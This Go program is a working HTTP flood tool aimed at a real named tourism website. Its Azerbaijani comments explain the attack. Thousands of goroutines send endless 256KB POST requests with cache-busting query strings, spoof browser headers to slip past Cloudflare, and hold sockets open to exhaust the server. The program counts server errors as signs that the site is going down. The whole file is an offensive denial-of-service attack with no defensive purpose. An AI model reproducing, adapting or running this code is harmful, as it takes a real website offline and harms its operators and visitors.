package main

import (
	"crypto/tls"
	"fmt"
	"math/rand"
	"net/http"
	"strings"
	"sync"
	"time"
	"sync/atomic"
)

func main() {
	target := "https://armenia.travel/#"
	// Railway resurslarını sona qədər istifadə etmək üçün thread sayını artırırıq
	workers := 4000 
	
	fmt.Printf("[!!!] HAKAI-SUPERCELL AKTİVDİR: %s\n", target)

	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
			// Müasir brauzer TLS barmaq izi (JA3) təqlidi
			MinVersion: tls.VersionTLS12,
			MaxVersion: tls.VersionTLS13,
		},
		MaxIdleConns:        50000,
		MaxIdleConnsPerHost: 25000,
		// Bağlantıları açıq saxlayaraq serverin socket limitini doldururuq
		DisableKeepAlives: false, 
		IdleConnTimeout:   90 * time.Second,
	}

	client := &http.Client{Transport: tr, Timeout: 5 * time.Second}
	var crashCount uint64

	var wg sync.WaitGroup
	for i := 0; i < workers; i++ {
		wg.Add(1)
		go func(id int) {
			defer wg.Done()
			// Serverin CPU-sunu 100% yükə salacaq daha böyük payload
			payload := "x=" + strings.Repeat("Z", 256000) // 256KB hər müraciətdə
			
			for {
				// Cache bypass - server hər sorğunu yeni sorğu kimi emal etməlidir
				u := fmt.Sprintf("%s?v=%d&q=%d", target, time.Now().UnixNano(), rand.Int())
				
				req, _ := http.NewRequest("POST", u, strings.NewReader(payload))
				
				// Cloudflare-i "bu real insandır" deyə aldatmaq üçün başlıqlar
				req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/122.0.0.0")
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				req.Header.Set("Cache-Control", "no-cache, no-store, must-revalidate")
				req.Header.Set("Connection", "keep-alive")
				req.Header.Set("X-Requested-With", "XMLHttpRequest")

				resp, err := client.Do(req)
				if err == nil {
					if resp.StatusCode >= 500 {
						atomic.AddUint64(&crashCount, 1)
					}
					// Body-ni dərhal bağlamırıq ki, socket bir müddət məşğul qalsın
					time.Sleep(100 * time.Millisecond)
					resp.Body.Close()
				} else {
					// Əgər timeout və ya connection refused olursa, server artıq "ölüdür"
					atomic.AddUint64(&crashCount, 1)
				}
			}
		}(i)
	}

	// Status Hesabatı (Railway loglarını doldurmadan)
	go func() {
		for {
			time.Sleep(3 * time.Second)
			fmt.Printf("[STATUS] Server Çöküş Siqnalları (Error): %d\n", atomic.LoadUint64(&crashCount))
		}
	}()

	wg.Wait()
}
